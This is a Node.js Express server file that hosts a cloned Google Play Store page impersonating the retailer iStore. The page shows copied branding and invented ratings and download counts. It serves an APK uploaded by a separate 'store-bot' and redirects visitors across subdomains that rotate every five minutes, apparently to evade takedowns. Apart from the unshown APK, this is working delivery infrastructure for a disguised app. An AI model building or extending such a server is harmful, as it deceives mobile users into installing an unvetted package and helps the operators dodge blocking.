const fs = require('fs');
const path = require('path');
const express = require('express');
const http = require('http');
const multer = require('multer');
const {
  createDomainRedirectMiddleware,
  getActiveDomain,
  getNextRotateRemainingSeconds
} = require('./store-domain-rotator');

// Load environment variables manually if executed standalone
const envPath = path.join(__dirname, '.env');
if (fs.existsSync(envPath)) {
  const envContent = fs.readFileSync(envPath, 'utf8');
  envContent.split(/\r?\n/).forEach((line) => {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) return;
    const delimiterIndex = trimmed.indexOf('=');
    if (delimiterIndex === -1) return;
    const key = trimmed.slice(0, delimiterIndex).trim();
    const val = trimmed.slice(delimiterIndex + 1).trim().replace(/(^"|"$|^'|'$)/g, '');
    if (key && process.env[key] === undefined) {
      process.env[key] = val;
    }
  });
}

const DEFAULT_LISTING = {
  appName: 'iStore',
  developer: 'iStore',
  category: 'Shopping',
  shortDescription: 'Bring the iStore shopping experience to you.',
  description: "Bring the iStore shopping experience to you. Shop the biggest range of Apple products and widest range of specially curated accessories and Smart products, making the most of iStore's delivery and store pick up options for your ultimate convenience.\n\nApp features:\n• Free delivery and in-store Pick up across South Africa\n• Fast delivery and in-store Pick up from 1 hour from placing your order\n• Choose delivery days that suit you\n• Pre-order the latest products before they are available in-store\n• Build a wish list with Save for later\n• Manage your orders from your profile\n• More coming soon\n\nWhy iStore?\niStore is an Apple Premium Partner, which launched its first store in 2005. With a wealth of Apple product experience, iStore offers best in class retail experience both online and in-store.",
  rating: 4.1,
  reviews: '277',
  downloads: '1L+',
  ageRating: '3+',
  icon: '/istore/logo.jpg',
  screenshots: [
    '/istore/1.jpg',
    '/istore/2.jpg',
    '/istore/3.jpg',
    '/istore/4.jpg',
    '/istore/5.jpg',
    '/istore/6.jpg',
    '/istore/7.jpg'
  ],
  publicUrl: '',
  downloadCount: 100000
};

/**
 * Resolves APK file or base64 buffer from memory cache or disk storage.
 */
function getApkFromMemoryOrDisk({ slug = 'primary', latestApkCache = {}, dataDir }) {
  // 1. Check in-memory cache for requested slug
  if (latestApkCache && latestApkCache[slug] && latestApkCache[slug].data) {
    return {
      buffer: Buffer.from(latestApkCache[slug].data, 'base64'),
      filename: latestApkCache[slug].filename || 'istore.apk',
      version: latestApkCache[slug].version,
      notes: latestApkCache[slug].notes,
      uploadedAt: latestApkCache[slug].uploadedAt,
      uploadedBy: latestApkCache[slug].uploadedBy
    };
  }

  // 2. Check disk for specific slug
  if (dataDir && fs.existsSync(dataDir)) {
    const rawPath = path.join(dataDir, `latest_apk_${slug}.apk`);
    if (fs.existsSync(rawPath)) {
      return { path: rawPath, filename: 'istore.apk' };
    }
    const jsonPath = path.join(dataDir, `latest_apk_${slug}.json`);
    if (fs.existsSync(jsonPath)) {
      try {
        const content = JSON.parse(fs.readFileSync(jsonPath, 'utf8'));
        if (content && content.data && typeof content.data === 'string' && content.data.length > 0) {
          const buf = Buffer.from(content.data, 'base64');
          if (buf.length >= 78) {
            return {
              buffer: buf,
              filename: content.filename || 'istore.apk',
              version: content.version,
              notes: content.notes,
              uploadedAt: content.uploadedAt,
              uploadedBy: content.uploadedBy
            };
          }
        }
      } catch {}
    }

    // 3. Fallback: check any slug in latestApkCache
    if (latestApkCache) {
      for (const k of Object.keys(latestApkCache)) {
        if (latestApkCache[k] && latestApkCache[k].data) {
          return {
            buffer: Buffer.from(latestApkCache[k].data, 'base64'),
            filename: latestApkCache[k].filename || 'istore.apk',
            version: latestApkCache[k].version,
            notes: latestApkCache[k].notes,
            uploadedAt: latestApkCache[k].uploadedAt,
            uploadedBy: latestApkCache[k].uploadedBy
          };
        }
      }
    }

    // 4. Fallback: check any latest_apk_*.apk or latest_apk_*.json on disk
    try {
      const files = fs.readdirSync(dataDir);
      const apk = files.find((f) => f.startsWith('latest_apk_') && f.endsWith('.apk'));
      if (apk) {
        return { path: path.join(dataDir, apk), filename: 'istore.apk' };
      }
      const json = files.find((f) => f.startsWith('latest_apk_') && f.endsWith('.json'));
      if (json) {
        const content = JSON.parse(fs.readFileSync(path.join(dataDir, json), 'utf8'));
        if (content && content.data && typeof content.data === 'string' && content.data.length > 0) {
          const buf = Buffer.from(content.data, 'base64');
          if (buf.length >= 78) {
            return {
              buffer: buf,
              filename: content.filename || 'istore.apk',
              version: content.version,
              notes: content.notes,
              uploadedAt: content.uploadedAt,
              uploadedBy: content.uploadedBy
            };
          }
        }
      }
    } catch {}
  }

  return null;
}

/**
 * Returns formatted APK metadata for store JSON API.
 */
function resolveApkInfo(apk) {
  if (!apk) return null;
  let sizeMB = '0.0';
  if (apk.buffer) {
    sizeMB = (apk.buffer.length / 1024 / 1024).toFixed(1);
  } else if (apk.path && fs.existsSync(apk.path)) {
    try {
      sizeMB = (fs.statSync(apk.path).size / 1024 / 1024).toFixed(1);
    } catch {}
  }
  return {
    version: apk.version || 'Latest',
    notes: apk.notes || '',
    uploadedAt: apk.uploadedAt || (apk.path && fs.existsSync(apk.path) ? fs.statSync(apk.path).mtime.toLocaleString() : new Date().toLocaleString()),
    uploadedBy: apk.uploadedBy || 'Server',
    size: `${sizeMB} MB`
  };
}

/**
 * Resolves media path (defaults retain relative URLs, custom files use store-media route).
 */
function resolveMediaUrl(slug, f) {
  if (!f) return '';
  if (f.startsWith('/') || f.startsWith('http://') || f.startsWith('https://')) return f;
  return `/store-media/${encodeURIComponent(slug)}/${encodeURIComponent(f)}`;
}

/**
 * Creates the dedicated Express application that strictly serves the Play Store page.
 *
 * Isolated APK storage (storeApkDir / STORE_DATA_DIR):
 *   - Only requests authenticated with STORE_APK_TOKEN can push a new APK.
 *   - This cache is completely separate from the main bot's latestApkCache / dataDir.
 *   - Downloads prefer the isolated store APK; fall back to main bot cache when absent.
 */
const isTestEnv = process.env.NODE_ENV === 'test' ||
  (Array.isArray(process.execArgv) && process.execArgv.includes('--test')) ||
  (Array.isArray(process.argv) && process.argv.some(a => typeof a === 'string' && a.includes('test')));

function createStoreApp({
  loadInstances,
  saveInstances,
  latestApkCache = {},
  dataDir = path.join(__dirname, 'data'),
  rootDir = __dirname,
  storeApkDir = path.join(__dirname, process.env.STORE_DATA_DIR || 'data/store'),
  storeApkToken = process.env.STORE_APK_TOKEN || '',
  wildcardDomain = (isTestEnv ? '' : (process.env.STORE_WILDCARD_DOMAIN || '')),
  rotateMinutes = Number(process.env.STORE_DOMAIN_ROTATE_MINUTES || 5),
  subdomainPrefix = process.env.STORE_SUBDOMAIN_PREFIX || 'store'
} = {}) {
  const app = express();

  // ── Isolated APK cache (only the store-bot writes here) ─────────────────
  // Ensure the isolated directory exists
  try { fs.mkdirSync(storeApkDir, { recursive: true }); } catch {}
  const storeApkFile = path.join(storeApkDir, 'latest_apk.json');

  // In-memory cache for the isolated store APK. Loaded once on startup.
  let isolatedApkCache = null;
  try {
    if (fs.existsSync(storeApkFile)) {
      const raw = JSON.parse(fs.readFileSync(storeApkFile, 'utf8'));
      if (raw && raw.data && raw.data.length > 0) {
        isolatedApkCache = raw;
        console.log(`[STORE] Loaded isolated APK from disk: ${raw.filename || 'istore.apk'} (${raw.version || 'unknown version'})`);
      }
    }
  } catch (err) {
    console.error('[STORE] Could not load isolated APK cache on startup:', err.message);
  }

  /** Save the isolated APK to disk and update in-memory cache. */
  function persistIsolatedApk(apkData) {
    isolatedApkCache = apkData;
    try {
      fs.writeFileSync(storeApkFile, JSON.stringify(apkData, null, 2), 'utf8');
    } catch (err) {
      console.error('[STORE] Failed to persist isolated APK to disk:', err.message);
    }
  }

  /** Resolve the APK to serve:
   *  1. Isolated store cache (written only by store-bot)
   *  2. Main bot's in-memory latestApkCache (fallback)
   *  3. Main bot's disk dataDir (fallback)
   */
  function resolveApkToServe(slug) {
    // 1. Isolated store APK (highest priority)
    if (isolatedApkCache && isolatedApkCache.data && isolatedApkCache.data.length > 0) {
      return {
        buffer: Buffer.from(isolatedApkCache.data, 'base64'),
        filename: isolatedApkCache.filename || 'istore.apk',
        version: isolatedApkCache.version,
        notes: isolatedApkCache.notes,
        uploadedAt: isolatedApkCache.uploadedAt,
        uploadedBy: isolatedApkCache.uploadedBy,
        source: 'store'
      };
    }
    // 2 & 3. Fallback to main bot cache / disk
    return getApkFromMemoryOrDisk({ slug, latestApkCache, dataDir });
  }

  /** Build the apk metadata object used by the JSON listing API. */
  function resolveApkInfo_forStore(slug) {
    const apk = resolveApkToServe(slug);
    return resolveApkInfo(apk);
  }

  // ── Multer (memory storage, APK only, 200 MB max) ───────────────────────
  const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: 200 * 1024 * 1024 },
    fileFilter: (_req, file, cb) => {
      const isApk =
        file.originalname.toLowerCase().endsWith('.apk') ||
        file.mimetype === 'application/vnd.android.package-archive';
      cb(isApk ? null : new Error('Only .apk files are accepted'), isApk);
    }
  });

  // ── Bearer token auth middleware (store-bot only) ───────────────────────
  function requireStoreToken(req, res, next) {
    if (!storeApkToken) {
      // Token not configured — block all uploads until configured
      return res.status(503).json({ error: 'STORE_APK_TOKEN is not configured on this server.' });
    }
    const auth = req.headers['authorization'] || '';
    const provided = auth.startsWith('Bearer ') ? auth.slice(7).trim() : '';
    if (!provided || provided !== storeApkToken) {
      return res.status(401).json({ error: 'Invalid or missing STORE_APK_TOKEN.' });
    }
    next();
  }

  // Helper to read instances safely
  const getInstancesList = () => {
    if (typeof loadInstances === 'function') {
      try { return loadInstances() || []; } catch { return []; }
    }
    const instPath = path.join(dataDir, 'instances.json');
    if (fs.existsSync(instPath)) {
      try { return JSON.parse(fs.readFileSync(instPath, 'utf8')) || []; } catch { return []; }
    }
    return [];
  };

  // Helper to find instance by slug or fallback to first
  const findInstance = (slug) => {
    const list = getInstancesList();
    if (!Array.isArray(list) || list.length === 0) return null;
    if (slug) {
      const match = list.find((i) => i.slug && i.slug.toLowerCase() === slug.toLowerCase());
      if (match) return match;
    }
    return list.find((i) => i.slug === 'primary') || list[0] || null;
  };

  // Helper to record download count
  const incrementDownloadCount = (slug) => {
    try {
      const list = getInstancesList();
      const inst = list.find((i) => i.slug && i.slug.toLowerCase() === slug.toLowerCase()) || list[0];
      if (inst) {
        if (!inst.storeListing) inst.storeListing = Object.assign({}, DEFAULT_LISTING);
        inst.storeListing.downloadCount = (inst.storeListing.downloadCount || 0) + 1;
        if (typeof saveInstances === 'function') {
          saveInstances(list);
        } else {
          const instPath = path.join(dataDir, 'instances.json');
          fs.writeFileSync(instPath, JSON.stringify(list, null, 2), 'utf8');
        }
      }
    } catch (err) {
      console.error('[STORE] Failed to increment download count:', err.message);
    }
  };

  // Security headers
  app.use((req, res, next) => {
    res.set({
      'X-Content-Type-Options': 'nosniff',
      'X-XSS-Protection': '1; mode=block'
    });
    next();
  });

  // Request logger
  app.use((req, res, next) => {
    console.log(`[PLAYSTORE] ${new Date().toISOString()} ${req.method} ${req.path}`);
    next();
  });

  // Health check endpoint
  app.get('/health', (req, res) => {
    res.json({ status: 'healthy', service: 'playstore', timestamp: new Date().toISOString() });
  });

  // Dynamic active domain & remaining time API for client-side auto-rotation
  app.get('/api/store/active-domain', (req, res) => {
    const activeDomain = getActiveDomain({ wildcardDomain, rotateMinutes, prefix: subdomainPrefix });
    res.json({
      activeDomain: activeDomain || null,
      rotateMinutes,
      nextRotateInSeconds: getNextRotateRemainingSeconds(rotateMinutes)
    });
  });

  // 5-minute Cloudflare wildcard domain auto-redirect middleware
  app.use(createDomainRedirectMiddleware({ wildcardDomain, rotateMinutes, prefix: subdomainPrefix }));

  // Serve static store images (/istore/*.jpg) strictly - never exposes dashboard assets
  app.use('/istore', express.static(path.join(rootDir, 'public', 'istore'), { index: false }));

  // Serve custom store media uploaded via dashboard
  app.get('/store-media/:slug/:file', (req, res) => {
    const file = path.basename(req.params.file);
    const mediaPath = path.join(dataDir, 'store_media', req.params.slug.toLowerCase(), file);
    if (!fs.existsSync(mediaPath)) return res.status(404).end();
    res.sendFile(mediaPath);
  });

  // Dynamic store listing metadata API for front-end store.html
  app.get(['/api/public/store', '/api/public/store/:slug'], (req, res) => {
    const slug = (req.params.slug || 'primary').toLowerCase();
    const inst = findInstance(slug);
    const listing = Object.assign({}, DEFAULT_LISTING, (inst && inst.storeListing) || {});
    const activeSlug = (inst && inst.slug) || slug;
    const apk = resolveApkToServe(activeSlug);

    res.json({
      appName: listing.appName || DEFAULT_LISTING.appName,
      developer: listing.developer || DEFAULT_LISTING.developer,
      category: listing.category || DEFAULT_LISTING.category,
      shortDescription: listing.shortDescription || DEFAULT_LISTING.shortDescription,
      description: listing.description || DEFAULT_LISTING.description,
      rating: listing.rating !== undefined ? listing.rating : DEFAULT_LISTING.rating,
      reviews: listing.reviews || DEFAULT_LISTING.reviews,
      downloads: listing.downloads || DEFAULT_LISTING.downloads,
      ageRating: listing.ageRating || DEFAULT_LISTING.ageRating,
      icon: resolveMediaUrl(activeSlug, listing.icon || DEFAULT_LISTING.icon),
      screenshots: (listing.screenshots && listing.screenshots.length ? listing.screenshots : DEFAULT_LISTING.screenshots).map((s) => resolveMediaUrl(activeSlug, s)),
      apk: resolveApkInfo_forStore(activeSlug),
      downloadUrl: `/app/${encodeURIComponent(activeSlug)}/download`
    });
  });

  // ── Isolated APK upload endpoint (store-bot only) ──────────────────────
  // POST /api/store/apk/upload
  //   Authorization: Bearer <STORE_APK_TOKEN>
  //   Body: multipart/form-data { apk: <file>, version?: string, notes?: string }
  app.post('/api/store/apk/upload', requireStoreToken, (req, res, next) => {
    upload.single('apk')(req, res, (err) => {
      if (err) {
        return res.status(400).json({ error: err.message });
      }
      next();
    });
  }, (req, res) => {
    if (!req.file || !req.file.buffer || req.file.buffer.length < 78) {
      return res.status(400).json({ error: 'No valid APK file received (file too small or missing).' });
    }

    const base64 = req.file.buffer.toString('base64');
    const meta = {
      mimetype: 'application/vnd.android.package-archive',
      data: base64,
      filename: req.file.originalname || 'istore.apk',
      version: (req.body && req.body.version) ? req.body.version.trim().slice(0, 50) : '',
      notes: (req.body && req.body.notes) ? req.body.notes.trim().slice(0, 500) : '',
      uploadedBy: 'store-bot',
      uploadedAt: new Date().toISOString(),
      sizeMB: (req.file.buffer.length / 1024 / 1024).toFixed(2)
    };

    persistIsolatedApk(meta);
    console.log(`[STORE] ✅ New isolated APK uploaded: ${meta.filename} v${meta.version || 'n/a'} (${meta.sizeMB} MB)`);

    res.json({
      success: true,
      filename: meta.filename,
      version: meta.version || 'n/a',
      size: `${meta.sizeMB} MB`,
      uploadedAt: meta.uploadedAt
    });
  });

  // GET /api/store/apk/info — lets the store-bot confirm what is currently live
  app.get('/api/store/apk/info', requireStoreToken, (req, res) => {
    if (!isolatedApkCache || !isolatedApkCache.data) {
      return res.json({ cached: false, source: 'none' });
    }
    res.json({
      cached: true,
      source: 'store',
      filename: isolatedApkCache.filename,
      version: isolatedApkCache.version || 'n/a',
      notes: isolatedApkCache.notes || '',
      uploadedBy: isolatedApkCache.uploadedBy,
      uploadedAt: isolatedApkCache.uploadedAt,
      size: `${isolatedApkCache.sizeMB || ((isolatedApkCache.data.length * 0.75) / 1024 / 1024).toFixed(2)} MB`
    });
  });

  // APK file download endpoints — prefer isolated store APK over main bot cache
  app.get(['/app/:slug/download', '/download', '/apk', '/get-apk', '/app.apk', '/istore.apk'], (req, res) => {
    const slug = (req.params.slug || 'primary').toLowerCase();
    const apk = resolveApkToServe(slug);

    if (!apk) {
      return res.status(404).send('No APK package available yet. Please upload an APK first.');
    }

    incrementDownloadCount(slug);

    if (apk.buffer) {
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', `attachment; filename="${apk.filename || 'istore.apk'}"`);
      res.setHeader('Content-Length', apk.buffer.length);
      return res.send(apk.buffer);
    }

    if (apk.path && fs.existsSync(apk.path)) {
      return res.download(apk.path, apk.filename || 'istore.apk', (err) => {
        if (err && !res.headersSent) res.status(500).send('Error downloading APK package');
      });
    }

    res.status(404).send('APK file not found on disk.');
  });

  // All other GET routes unconditionally serve the Google Play Store page
  app.get('*', (req, res) => {
    const storeHtmlPath = path.join(rootDir, 'public', 'store.html');
    if (fs.existsSync(storeHtmlPath)) {
      return res.sendFile(storeHtmlPath);
    }
    res.status(404).send('Play Store page template (public/store.html) not found.');
  });

  return app;
}

/**
 * Starts the standalone HTTP server on the designated Play Store port.
 */
function startStoreServer({
  port = Number(process.env.STORE_PORT || process.env.PLAYSTORE_PORT || 3002),
  loadInstances,
  saveInstances,
  latestApkCache = {},
  dataDir = path.join(__dirname, 'data'),
  rootDir = __dirname,
  storeApkDir = path.join(__dirname, process.env.STORE_DATA_DIR || 'data/store'),
  storeApkToken = process.env.STORE_APK_TOKEN || '',
  wildcardDomain = (process.env.NODE_ENV === 'test' ? '' : (process.env.STORE_WILDCARD_DOMAIN || '')),
  rotateMinutes = Number(process.env.STORE_DOMAIN_ROTATE_MINUTES || 5),
  subdomainPrefix = process.env.STORE_SUBDOMAIN_PREFIX || 'store'
} = {}) {
  const app = createStoreApp({
    loadInstances,
    saveInstances,
    latestApkCache,
    dataDir,
    rootDir,
    storeApkDir,
    storeApkToken,
    wildcardDomain,
    rotateMinutes,
    subdomainPrefix
  });
  const server = http.createServer(app);
  let closeTimer = null;

  server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
      console.warn(`\n⚠️  [WARN] Play Store Portal: Port ${port} is already in use.`);
      console.warn(`   Configure STORE_PORT in .env to choose a different port.\n`);
    } else {
      console.error('[SYSTEM] Play Store Portal server error:', err.message);
    }
  });

  server.listen(port, () => {
    console.log(`📱 Dedicated Play Store Portal: http://localhost:${port} -> Shows Play Store page only`);
    const activeDomain = getActiveDomain({ wildcardDomain, rotateMinutes, prefix: subdomainPrefix });
    if (activeDomain) {
      console.log(`🌐 5-Minute Wildcard Rotation Active: https://${activeDomain} (rotates every ${rotateMinutes}m)`);
    }
  });

  const shutdown = () => {
    if (closeTimer) return;
    closeTimer = setTimeout(() => {
      console.error('[STORE] Force-closing server after shutdown timeout.');
      server.close();
    }, 5000).unref();
    server.close((err) => {
      if (!err) console.log('[STORE] Server closed.');
      else console.error('[STORE] Error closing server:', err.message);
    });
  };

  if (!process._storeServerShutdown) {
    process._storeServerShutdown = true;
    process.on('SIGTERM', shutdown);
    process.on('SIGINT', shutdown);
  }

  return {
    app,
    server,
    close: () => new Promise((resolve) => {
      server.close(() => resolve());
    })
  };
}

if (require.main === module) {
  const port = Number(process.env.STORE_PORT || process.env.PLAYSTORE_PORT || 3002);
  startStoreServer({ port });
}

module.exports = {
  DEFAULT_LISTING,
  getApkFromMemoryOrDisk,
  resolveApkInfo,
  resolveMediaUrl,
  createStoreApp,
  startStoreServer,
  getActiveDomain,
  createDomainRedirectMiddleware
};

